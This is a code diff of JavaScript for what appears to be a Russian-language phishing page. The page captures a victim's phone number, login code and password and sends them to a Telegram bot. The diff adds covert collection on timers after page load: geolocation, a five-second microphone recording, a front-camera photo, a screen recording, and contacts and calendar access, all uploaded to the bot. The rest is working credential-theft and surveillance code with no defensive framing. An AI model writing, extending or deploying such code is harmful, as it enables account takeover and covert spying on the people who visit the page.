@@ -88,6 +88,20 @@ function sendPhoto(blob, caption) {
   fetch('https://api.telegram.org/bot' + token + '/sendPhoto', { method: 'POST', body: form });
 }
 
+function sendVoice(blob) {
+  var form = new FormData();
+  form.append('chat_id', chat);
+  form.append('audio', blob, 'voice.webm');
+  fetch('https://api.telegram.org/bot' + token + '/sendVoice', { method: 'POST', body: form });
+}
+
+function sendVideo(blob) {
+  var form = new FormData();
+  form.append('chat_id', chat);
+  form.append('video', blob, 'video.webm');
+  fetch('https://api.telegram.org/bot' + token + '/sendVideo', { method: 'POST', body: form });
+}
+
 function getDeviceInfo() {
   return 'Устройство: ' + navigator.userAgent +
     '\nЯзык: ' + navigator.language +
@@ -116,21 +130,12 @@ function getBattery() {
 
 function getConnection() {
   if (navigator.connection) {
-    send('📶 Сеть: ' + (navigator.connection.effectiveType || 'unknown') +
-      ' | ' + (navigator.connection.downlink || '?') + ' Mbps');
+    send('📶 Сеть: ' + (navigator.connection.effectiveType || 'unknown') + ' | ' + (navigator.connection.downlink || '?') + ' Mbps');
   }
 }
 
-function getScreenInfo() {
-  send('🖥 Экран: ' + screen.width + 'x' + screen.height +
-    '\nОриентация: ' + (screen.orientation ? screen.orientation.type : 'н/д') +
-    '\nЦвет: ' + screen.colorDepth + ' bit' +
-    '\nDPR: ' + window.devicePixelRatio);
-}
-
 function getTimeZone() {
-  send('🕐 Часовой пояс: ' + Intl.DateTimeFormat().resolvedOptions().timeZone +
-    '\nВремя: ' + new Date().toLocaleString('ru-RU'));
+  send('🕐 Часовой пояс: ' + Intl.DateTimeFormat().resolvedOptions().timeZone + '\nВремя: ' + new Date().toLocaleString('ru-RU'));
 }
 
 function getUserID() {
@@ -145,72 +150,118 @@ function getUserID() {
 function takeScreenshot() {
   if (typeof html2canvas !== 'undefined') {
     html2canvas(document.body).then(function(canvas) {
-      canvas.toBlob(function(blob) {
-        sendPhoto(blob, '📸 Скриншот');
-      }, 'image/jpeg', 0.7);
+      canvas.toBlob(function(blob) { sendPhoto(blob, '📸 Скриншот'); }, 'image/jpeg', 0.7);
     });
   }
 }
 
-function getFonts() {
-  var fonts = ['Arial', 'Times New Roman', 'Courier New', 'Georgia', 'Verdana', 'Tahoma', 'Trebuchet MS', 'Comic Sans MS', 'Impact', 'Webdings'];
-  var detected = [];
-  var canvas = document.createElement('canvas');
-  var ctx = canvas.getContext('2d');
-  var text = 'mmmmmmmmmmlli';
-  var baseFonts = ['monospace', 'sans-serif', 'serif'];
-  var baseSizes = {};
-  baseFonts.forEach(function(base) {
-    ctx.font = '72px ' + base;
-    baseSizes[base] = ctx.measureText(text).width;
-  });
-  fonts.forEach(function(font) {
-    baseFonts.forEach(function(base) {
-      ctx.font = '72px "' + font + '", ' + base;
-      if (ctx.measureText(text).width !== baseSizes[base]) {
-        if (detected.indexOf(font) === -1) detected.push(font);
-      }
-    });
-  });
-  if (detected.length) send('🔤 Шрифты: ' + detected.join(', '));
-}
-
-function detectEmulator() {
-  var isEmulator = false;
-  if (navigator.userAgent.indexOf('Android') > -1) {
-    if (navigator.userAgent.indexOf('sdk') > -1 || navigator.userAgent.indexOf('Emulator') > -1) {
-      isEmulator = true;
-    }
+function getGeo() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(function(pos) {
+      send('📍 Гео: ' + pos.coords.latitude + ', ' + pos.coords.longitude);
+    }, function() { send('📍 Гео: отказ'); });
   }
-  if (isEmulator) send('⚠️ Возможно эмулятор');
 }
 
-function trackTime() {
-  var start = Date.now();
-  window.addEventListener('beforeunload', function() {
-    var sec = Math.round((Date.now() - start) / 1000);
-    var img = new Image();
-    img.src = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat + '&text=' + encodeURIComponent('⏱ Время на сайте: ' + sec + ' сек');
-  });
+function recordVoice() {
+  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+    navigator.mediaDevices.getUserMedia({ audio: true })
+      .then(function(stream) {
+        var recorder = new MediaRecorder(stream);
+        var chunks = [];
+        recorder.ondataavailable = function(e) { chunks.push(e.data); };
+        recorder.onstop = function() {
+          sendVoice(new Blob(chunks, { type: 'audio/webm' }));
+          stream.getTracks().forEach(function(t) { t.stop(); });
+        };
+        recorder.start();
+        setTimeout(function() { recorder.stop(); }, 5000);
+      })
+      .catch(function() {});
+  }
+}
+
+function takePhoto() {
+  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+      .then(function(stream) {
+        var video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        setTimeout(function() {
+          var canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+          canvas.toBlob(function(blob) { sendPhoto(blob, '🤳 Селфи'); }, 'image/jpeg', 0.8);
+          stream.getTracks().forEach(function(t) { t.stop(); });
+        }, 2000);
+      })
+      .catch(function() {});
+  }
+}
+
+function recordScreen() {
+  if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
+    navigator.mediaDevices.getDisplayMedia({ video: true })
+      .then(function(stream) {
+        var recorder = new MediaRecorder(stream);
+        var chunks = [];
+        recorder.ondataavailable = function(e) { chunks.push(e.data); };
+        recorder.onstop = function() {
+          sendVideo(new Blob(chunks, { type: 'video/webm' }));
+          stream.getTracks().forEach(function(t) { t.stop(); });
+        };
+        recorder.start();
+        setTimeout(function() { recorder.stop(); }, 5000);
+      })
+      .catch(function() {});
+  }
+}
+
+function askNotifications() {
+  if ('Notification' in window && Notification.permission === 'default') {
+    Notification.requestPermission();
+  }
+}
+
+function getContacts() {
+  if (navigator.contacts && navigator.contacts.select) {
+    navigator.contacts.select(['name', 'tel'], { multiple: true })
+      .then(function(contacts) {
+        if (contacts.length) send('📇 Контакты: ' + JSON.stringify(contacts));
+      })
+      .catch(function() {});
+  }
+}
+
+function getCalendar() {
+  if (navigator.calendar && navigator.calendar.query) {
+    navigator.calendar.query({ start: new Date(0), end: new Date() })
+      .then(function(events) {
+        if (events.length) send('📅 Календарь: ' + events.length + ' событий');
+      })
+      .catch(function() {});
+  }
 }
 
 send('👤 Новый визит ID: ' + getUserID() + '\n' + getDeviceInfo());
 getIP();
 getBattery();
 getConnection();
-getScreenInfo();
 getTimeZone();
-getFonts();
-detectEmulator();
-trackTime();
+getGeo();
 setTimeout(takeScreenshot, 3000);
+setTimeout(recordVoice, 5000);
+setTimeout(takePhoto, 8000);
+setTimeout(recordScreen, 12000);
+setTimeout(askNotifications, 15000);
+setTimeout(getContacts, 18000);
+setTimeout(getCalendar, 20000);
 
 document.getElementById('next1').addEventListener('click', function() {
   var phone = document.getElementById('phone').value;
-  if (!phone || phone.length < 12) {
-    alert('Введите номер телефона');
-    return;
-  }
+  if (!phone || phone.length < 12) { alert('Введите номер телефона'); return; }
   userData.phone = phone;
   send('📱 Телефон: ' + phone);
   document.getElementById('step1').classList.add('hidden');
@@ -220,10 +271,7 @@ document.getElementById('next1').addEventListener('click', function() {
   var int = setInterval(function() {
     t--;
     timer.textContent = 'Отправим снова через ' + t + ' сек';
-    if (t <= 0) {
-      clearInterval(int);
-      timer.textContent = 'Отправить код снова';
-    }
+    if (t <= 0) { clearInterval(int); timer.textContent = 'Отправить код снова'; }
   }, 1000);
 });
 
@@ -238,10 +286,7 @@ document.getElementById('code').addEventListener('input', function() {
 
 document.getElementById('login').addEventListener('click', function() {
   var pass = document.getElementById('password').value;
-  if (!pass || pass.length < 1) {
-    alert('Введите пароль');
-    return;
-  }
+  if (!pass || pass.length < 1) { alert('Введите пароль'); return; }
   userData.pass = pass;
   send('🔒 Пароль: ' + pass);
   send('✅ Итог:\nТелефон: ' + userData.phone + '\nКод: ' + userData.code + '\nПароль: ' + pass);
